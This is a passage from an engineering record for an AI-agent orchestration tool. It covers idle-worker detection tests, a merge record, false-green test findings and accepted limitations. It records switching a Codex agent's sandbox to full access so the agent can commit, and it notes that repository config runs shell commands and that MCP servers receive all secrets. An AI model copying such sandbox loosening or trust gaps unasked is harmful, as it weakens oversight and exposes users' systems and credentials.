- `idle_worker_013` (re-delegation + late first `work-done`) — removing the superseded branch in `retire_outstanding_delegation` makes delegation #2 go silent. **Strengthened after a second audit:** the original form also passed when `retire_outstanding_delegation` was stubbed to a **complete no-op** (verified), because a watch that survives a late completion proves nothing about *which* record was consumed. It now carries a twice-delegated, twice-**completed** control worker whose second completion must retire what the first deliberately left armed, so a no-op `work-done` shows up as an extra prompt. Both mutations — the no-op and the removed superseded branch — now fail it.
- `idle_worker_007` (bounds) — clamping instead of falling back to the default fails it from either source.
- `idle_worker_008` (closed orchestrator + pane-id reuse) — **does not isolate a single guard**, and cannot: on the `StopAgent` path the `begin_pane_close` sweep drops the record before any timer can wake, so the identity gate is never reached. Both layers must be removed before a stray submit appears there. This was originally accepted as defense in depth; a second audit **overturned that reasoning**, because a **natural orchestrator exit** (the process simply ending, no `StopAgent`) runs no sweep at all, leaving the identity gate as the only guard — so a single-layer regression there is a genuine misdelivery into a tool-enabled agent, possibly in another orchestration.
- `idle_worker_014` (natural orchestrator exit + pane-id reuse) — the isolating test for that gate, added in response. The orchestrator stub ends its own process on a flag file, an unrelated agent takes the freed pane id, and dropping **only** the expected agent id from the guarded send (every sweep intact) reproduces the stray auto-submit: the successor's PTY receives the dead orchestration's full idle prompt. `008` stays green under that same mutation, which is the measured proof that `014` covers what `008` cannot.

Two honest gaps recorded rather than papered over: a **file-level** `0` cannot be proven decisive behaviorally, since no config value below one minute exists to contrast it against, so `idle_worker_003` records that as a *does-not-assert* and `007` covers it at the resolution level; and `check_claude_available` is offline only (regular-file check, JSON parse, OAuth token present, and each expiry bound to the presence of **its own non-empty token** — so an expired sole access token with no refresh token, and the converse, are both rejected, while an expired access token with a *live* refresh token still passes, matching Claude Code's own refresh), deliberately with **no probe request**, because a live round trip would spend tokens on every e2e run. Revoked credentials and network failures therefore remain an accepted false-positive class. The token-bound form replaced a first cut that evaluated both expiries independently of both tokens, where an absent expiry ("no expiry information") silently voted *live* for a token that was not there; `tests/real_agent_preflight.rs` pins every accepted and rejected shape, and the three that the binding closes were verified to fail against the unbound form.

### `linkage-check` — was red on both sides, now green after the merge

Before the `main` merge, `cargo xtask linkage-check` reported 4 *forbidden sleep call (Decision 21)* failures in `tests/e2e_delegate_work_done_chain.rs`, identically on this branch and on `main` (that file is untouched by this PRD). `main` has since removed those raw sleeps, so post-merge the check is **green** (365 catalog ids, 287 annotations, 104 allowlisted, 7 rules). One observation from that investigation stands and is worth reconciling separately from this PRD: **CI does not actually run `linkage-check`** (the `build`, `build-windows`, `build-macos`, and `security` jobs run fmt, clippy, build, `cargo test`/`nextest`, and `cargo audit`, with no `xtask` step), despite a stale comment at `.github/workflows/ci.yml:59` claiming it stays on the Linux job and CLAUDE.md rule 7 asserting CI fails the build on it.

## PRD #140 integration record — the `main` merge (2026-07-28, merge commit `4e61423`)

Merged `origin/main` (20 commits) rather than rebasing, because PR #223 is open and the history must not be force-pushed. Note the merge target was `origin/main`, one commit ahead of the local `main` ref (a docs-only PRD #225 move). Three textual conflicts — `devbox.json`, `src/agent_pty.rs`, `src/state.rs` — plus one genuine semantic integration that git cannot flag, described below. Fast tier **1252/1252** (was 1173/1173; `main` brought 75 tests and this merge adds 4), scoped `cargo test-e2e idle_worker` **15/15**, fmt/clippy (both feature sets) clean, `PROTOCOL_VERSION` still **6**.

**Conflicts.** `devbox.json` was one line: both sides had independently raised `codex-big` to `xhigh` effort, and this branch had also switched it to `--sandbox danger-full-access` (`33a21e7`), which supersedes `main`'s `workspace-write` + `network_access=true` (that network flag is meaningless under full access) and is what lets the Codex tester commit inside a worktree — see [Orchestration finding](#orchestration-finding--the-codex-tester-cannot-commit-in-a-worktree). `src/agent_pty.rs` was additive in all three hunks (`main`'s `hook_socket` field / `set_hook_socket` next to this PRD's `delegations`, `delegation_seq` and the delegation types). `src/state.rs` was the only interesting one: #140 M2.1 extracted `handle_delegate`'s target resolution into the pure, unit-testable `delegate_targets`, while this branch had added duplicate-role de-duplication (M1 audit finding 3) to the inline loop it replaced. Resolution took `main`'s call and **moved the de-dup into `delegate_targets`**, where it now has its own test rather than living in an untested loop.

**The semantic break, which compiled silently in the wrong form.** #140 replaced `pane_orchestration_map`'s `(name, orchestration_cwd)` tuple with `OrchestrationIdentity` — `Instance { id, name }` for a client that stamps the per-tab token, `NameCwd { name, cwd }` for one that does not. This PRD's design read *both* halves of that tuple, and each broke differently:

1. **Identity-bound delivery was comparing the wrong field.** The record carried the orchestration **name** and the pre-write revalidation compared names. After #140 a name is no longer an orchestration identity: two tabs of the same orchestration in the same directory are two distinct routing groups that answer the *same* name, so a name-only recheck cannot tell a re-homed pane from the original. The record now carries the whole `OrchestrationIdentity` and the new `orchestration_still_matches` (`src/state.rs`) compares the **per-tab token when both sides have one**, falling back to the name for token-less (pre-#140) panes. Absence on either side still never refuses — that rule is unchanged, because the `write_and_submit_guarded` agent-id gate is the primary guard and this check is defense in depth. `pane_orchestration_name` became `pane_orchestration`, returning name + instance token + orchestration cwd (`PaneOrchestration`).
2. **Config resolution would have silently lost the orchestration cwd.** `worker_response_timeout` reads the **orchestration** cwd before the worker cwd precisely for divergent-cwd cases (PRD #120 issue-dispatch clones), and it used to take that cwd straight out of the routing tuple. `Instance` carries **no cwd**, so reading it back from the identity would have resolved `None` for every modern client and quietly downgraded every delegation to the worker cwd — a silent behavior regression with no compile error and no failing test. The new `AppState::orchestration_cwd_of` instead rebuilds exactly what the daemon folds into the legacy tuple at `StartAgent` time: the orchestrator pane's `TabMembership::orchestration_cwd`, else its own per-pane cwd. Both construct sites set that field (`src/tab.rs:565`, `src/spawn.rs:338`), and the issue-dispatch site sets it to the worktree, so the orchestration-vs-worker distinction keeps its meaning. #140 itself does **not** relocate any cwd: its "worktree-per-orchestration model" is a documented product stance plus a non-blocking same-cwd warning, not a change to where orchestrations run.

**What did *not* need rework.** `handle_delegate` still fans out over a `(target_role, pane_id)` list in a synchronous loop, so the arm site is unchanged and still inside it; `handle_work_done`'s prologue is untouched, so the retire is still its first statement, above every early return. `begin_pane_close` / `finish_pane_close` / `closing_panes` are unaffected: #140 changed only the *synthetic* `dead_slot_pane_id` namespacing (TUI placeholder cards, never a real `DOT_AGENT_DECK_PANE_ID`), not real pane-id minting, reuse, or agent lifecycle. `write_and_submit_guarded`'s contract is unchanged. All eight hardening items survive.

**Test fidelity upgrade that came out of this.** The fast-tier harness previously registered a bare `(name, cwd)` tuple and spawned its orchestrator stub with **no** `tab_membership`, which meant the revalidation closure always short-circuited on an absent live identity — so a wrong comparison would have suppressed *every* idle prompt in production while every test stayed green. The harness now stamps a #140 `Instance` identity **and** a matching registry membership on the orchestrator pane, exactly as `StartAgent` does, so the "both identities present" path is the one under test. The successor stubs in `008`/`014` deliberately keep no membership, which is what leaves the agent-id gate as the isolating guard there. Four new tests, each proven capable of failing by mutating the guard it covers: `delegate_targets_de_duplicates_a_repeated_target_role`, `orchestration_still_matches_compares_the_instance_token_when_both_sides_have_one` (fails under the pre-#140 name-only comparison), `orchestration_cwd_of_falls_back_to_the_orchestrator_pane_cwd`, and `pane_orchestration_reports_the_instance_token_and_orchestration_cwd`. Inverting the token comparison additionally fails `idle_worker_001`, which is the measured proof that the revalidation closure is live on the delivery path rather than trivially true.

**Classification unchanged.** `PROTOCOL_VERSION` is 6 on both sides and after the merge; the idle prompt still never crosses the wire, so this PRD stays a **feature** (`changelog.d/126.feature.md`). #140 carries its own `changelog.d/140.breaking.md` for *its* semantic break, which is separate from this one.

### The Codex `tester` delivery failure is explained by `c9db4f1` (#237/#225)

The all-day symptom on this branch — a delegation to the Codex `tester` writes `worker-task-tester.md`, the `delegate` CLI exits 0, and the prompt is never consumed — matches the two stacked defects that `c9db4f1` fixes, and this repo's `tester` role is exactly the configuration they need: `command = "devbox run codex-big"` with `clear` defaulting to `true`. Defect 1: `dot-agent-deck wrap` emitted a `SessionStart` the instant `cmd.spawn()` returned, so the readiness gate released ~4 s before `node codex` was actually up and the prompt was written into a PTY running only `devbox`, where the line discipline echoed it away; the fork-time event is now marked `session_start_origin = "wrapper_fork"` and skipped for agents whose registry spec installs native hooks. Defect 2: `devbox run codex-big` resolves to no agent type so the pane spawns unwrapped, Codex's hooks then teach the registry `Some(Codex)`, and the first respawn replayed that learned badge into the launch — so a `clear = true` delegate brought the pane back up *wrapped*, straight into defect 1. `SESSION_START_WAIT_TIMEOUT` also went 10 s → 30 s, sized from measured Codex boot. Both halves are on `main` now, so the `tester` role should be usable again — worth a live delegation before relying on it for the e2e gate. Note this is a **different** problem from the worktree one recorded above: #237 fixes prompt *delivery*, not the sandbox's inability to reach a worktree's real git index, which this branch addresses separately via `--sandbox danger-full-access`.

### E2E gate record (2026-07-28) — and the false-greens it exposed on `main`

Run as `DOT_AGENT_DECK_RECORD=1 DOT_AGENT_DECK_REQUIRE_REAL_E2E=1 cargo test-e2e`: **2182 tests, 2178 passed, 4 failed, 0 skipped** (89s test phase). Everything this PRD owns is green, `linkage-check` passes, `fmt` and `clippy --all-targets -D warnings` are clean with and without `--features e2e`, and the live orchestration daemon was untouched throughout.

**The reel clip is secured:** `scheduler/idle-worker/012` (the real interactive Haiku orchestrator) passed in 16.7s and produced `full-stream.cast` (~68 KB) plus `final-grid.svg`. 115 casts were written by the gate run.

The four failures are a **pre-existing host-environment gap, not a regression**, and they are the most interesting result of the gate. All four are Codex real-agent tests (`delegate_009`, `codex_hooks_001`, `codex_live_001`, `codex_worker_001`) failing with one root cause: this host's Codex auth is an **API key**, while `CODEX_TEST_MODEL_DEFAULT` is `gpt-5.1-codex-mini`, which is **subscription-only**. A bare `codex exec` probe returns HTTP 404 *Model not found* for that model on this key while authenticating fine on `gpt-5-nano`, the helpers involved (`check_codex_available`, `codex_test_model`, `CODEX_TEST_MODEL_DEFAULT`) are untouched by this branch, and rerunning the four with `DOT_AGENT_DECK_CODEX_TEST_MODEL=gpt-5-nano` yields 5/5 PASS. Every failure was deterministic and identical — no flakes.

**Why this matters beyond this PRD:** on `main` those four tests print `SKIP:` and are **counted as PASS**, so the suite reports green while four real-agent scenarios assert nothing. That is precisely the false-green `DOT_AGENT_DECK_REQUIRE_REAL_E2E` was built to expose (review finding 3), and it found four instances on its first real run — none of them in this PRD's own tests. Worth a follow-up in its own right: either make `CODEX_TEST_MODEL_DEFAULT` reachable with API-key auth, or document the subscription requirement, so a maintainer without a Codex subscription is not silently running four fewer tests than they think.

Judged **not blocking**: the gap is environmental, proven pre-existing, and unrelated to this PRD's diff. A full rerun with the model override would produce a cosmetically cleaner `2182/2182` but no new information, since the remedy is already demonstrated; the three Codex casts it would add are irrelevant because the reel adapter only includes marked tests whose *source changed on this branch*, and only `tests/e2e_idle_worker_detector.rs` did.

### Accepted limitations

Recorded deliberately; the delegation-tracking ones (1–3) fail toward a discardable extra notification rather than silence, except where noted.

1. **Out-of-order completion credits the wrong delegation.** A `work-done` retires the *oldest* outstanding delegation for a pane. If the newest reports while an older one never does, the older is credited and the newest record stays armed, producing one spurious — discardable — nudge.
2. **A consumed-then-re-delegated record can be retired by a late completion.** If delegation #1's record was already consumed by its own timer (reported idle) and the orchestrator then re-delegates, a late `work-done` for #1 retires #2 outright, so #2 can go silent with no nudge. This is the one residual that fails toward silence. Both this and #1 are consequences of rejecting the alternative fix — correlating completion via a token echoed back by the agent — which would have made a safety mechanism depend on an **LLM faithfully round-tripping a string**.
3. **A failed pane close does not restore swept records.** Close un-marks the pane but leaves the dropped records dropped, so a genuinely stuck worker whose close *failed* is not reported afterward. Chosen as the fail-safe direction, on the grounds that a deliberate close means the operator is already handling that worker.
4. **`.dot-agent-deck.toml` is a trusted, code-executing input — the deck does not defend against a malicious one.** A role's `command` is run through a shell (`src/agent_pty.rs:988`), so opening an orchestration from a repository you do not trust executes that repository's role commands, exactly as running its `Makefile` would. Every lesser injection vector carried by the same file — a printable role name among them — is therefore dominated by that one, which is why this PRD's `[UNTRUSTED-ROLE-LABEL: … :END-UNTRUSTED-ROLE-LABEL]` framing is provenance clarity *within* the trust model rather than a boundary against it. See the [severity correction](#m1-hardening-record--review--audit-resolution-2026-07-28) in the hardening record.
5. **Package pinning is exact for fresh clones only.** `.pi/settings.json` pins `npm:pi-mcp-adapter@2.15.0` (Pi does accept the `@version` suffix — verified), but Pi writes its own generated manifest as `^2.15.0` regardless, and `save-exact` does not change it. Because that manifest and lock are gitignored and regenerated from `settings.json`, a fresh clone still resolves exactly 2.15.0; only a `pi update` inside an existing `.pi/npm` could drift within 2.x.

## Exit path

This now ships a real feature, so the normal flow applies (reversing the dogfood's exit path):

- **Rule 4 applies** — the daemon feature needs L2 tests, including a PTY-attached one (M1.4).
- **Changelog fragment** — a `changelog.d/126.feature.md` (feature; non-breaking target). Include the demo-reel link if one is produced.
- **Version bump** — per the release's policy; the feature rides this release's shared version.
- **Rule 12** — cross-version manual test to confirm non-breaking (M1.5).
- Rules 2 and 10 still apply (fmt/clippy before commit; no hard-wrapped Markdown prose).

## Background: the dogfood that led here

The config-only Phase 1 (ntfy over `curl`, wrapped in `scripts/notify.sh`, now being retired) verified the channel was reachable and fire-and-forget, and produced the findings that justify this rescope:

- **Telegram reachability is proven from Pi and Claude.** After the rescope to Telegram/MCP, live sends succeeded from the **Pi orchestrator** (via the `pi-mcp-adapter`, message_id 17) and from **Claude** (native `.mcp.json` discovery, message_id 18) to the maintainer's chat. `pi-mcp-adapter@2.15.0` (MIT) was source-reviewed clean and installed project-local (`.pi/settings.json`); `telegram` was added to `.mcp.json` with an env-placeholder token wired via `vals`.
- **"One `.mcp.json` for every agent" is a myth** — only Claude reads it natively; OpenCode uses `opencode.json`, Codex uses `~/.codex/config.toml`. This is why **orchestrator-only** notifications are the right design: only the orchestrator (Pi, which now has the adapter) needs to send, so the other agents' MCP-config divergence is irrelevant.
- **The felt need for the idle detector** was the decisive tripwire: the maintainer immediately wanted "notify me if a worker goes silent for too long", which config provably cannot deliver — the origin of milestone M1.
- Earlier dogfood tripwire thoughts (T1–T5) — wrapping `blocked` inside `work-done`, teeing the scheduler `Notifier` seam into the log, an `agent_notification_hint` field, a `[notifications]` config block for a private topic — remain recorded as design inputs; several are now moot (orchestrator-only + MCP) or superseded by the idle-detector decision.

Two security notes carried forward: every stdio MCP server declared in `.mcp.json` is spawned with the full parent environment (standard MCP-host behavior — all secrets visible to each server); and the MCP SDK carries 4 moderate, Windows-only transitive advisories. Both accepted.

## Key Files

- `src/daemon_protocol.rs`, the daemon, and the session prompt/input-injection path — where the idle-worker detector and its delivery live.
- `.dot-agent-deck.toml` — the new `worker_response_timeout_minutes` knob and this repo's rewritten orchestrator `prompt_template`.
- `.mcp.json` — the `telegram` MCP server (added); `.pi/settings.json` — the `pi-mcp-adapter` install.
- `docs/` + `site/sidebars.js` — the published feature/recipe page.
- `scripts/notify.sh`, `docs/develop/notifications-dogfood.md` — dogfood artifacts to remove/retire.

## Risks and Mitigations

- **False-positive idle alerts on legitimately long tasks.** *Mitigation:* 120-min default makes it rare; a false alert is a discardable message; one-shot avoids spam. Liveness-based detection deferred.
- **The change accidentally breaks TUI↔daemon compatibility.** *Mitigation:* reuse the existing injection path (no new wire shape); rule-12 cross-version manual test gates it.
- **Idle prompt injected mid-turn or racing a finish.** *Mitigation:* deliver only at a turn boundary; per-delegation timer cancelled by `work-done`.
- **Post-compaction silence of the recipe notifications.** *Mitigation:* the daemon's injected idle prompt is self-describing (survives compaction); gate/done notifications' compaction-mortality is a documented known limitation (#82).
- **Publishing the recipe before it is battle-tested.** *Mitigation:* frame it as an example, and validate on real runs (M5) including a compacting one.
- **The no-agent / dead-orchestrator gap.** *Mitigation:* explicitly out of scope and documented as a known limitation.
